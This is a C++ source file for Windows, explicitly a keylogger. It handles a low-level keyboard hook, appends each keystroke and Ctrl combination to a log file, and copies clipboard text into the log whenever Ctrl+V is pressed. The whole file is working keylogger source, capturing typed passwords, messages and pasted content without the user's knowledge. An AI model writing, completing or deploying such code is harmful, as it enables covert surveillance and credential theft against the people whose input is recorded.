#include "keylogger.h"
#include "keyboard.h"
#include "configuration.h"
#include <cstdint>

void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
{
    std::wofstream out_file{ configuration::out_file, std::ofstream::app };

    if (configuration::key_codes.find(kbd_hook->vkCode) != configuration::key_codes.cend())
    {
        out_file << configuration::key_codes.at(kbd_hook->vkCode);
    }
    else if (keyboard::is_control_down())
    {
        if (kbd_hook->vkCode == configuration::virtual_key_v)
        {
            write_clipboard_data(out_file);
        }
        else
        {
            out_file << L"[CTRL + " << static_cast<wchar_t>(kbd_hook->vkCode) << L"]";
        }
    }
    else
    {
        BYTE state[configuration::keyboard_state_size];
        keyboard::get_state(state);

        WCHAR key_buffer[configuration::key_buffer_size];
        const auto result = ToUnicode(kbd_hook->vkCode, kbd_hook->scanCode, state, key_buffer, configuration::key_buffer_size, 0);

        if (result > 0) out_file << key_buffer;
    }
}

void keylogger::write_clipboard_data(std::wofstream& stream)
{
    if (OpenClipboard(nullptr))
    {
        auto handle = GetClipboardData(CF_UNICODETEXT);

        if (handle != nullptr)
        {
            const WCHAR* const buffer = static_cast<WCHAR*>(GlobalLock(handle));

            if (buffer != nullptr) stream << buffer;

            GlobalUnlock(handle);
        }

        CloseClipboard();
    }
}
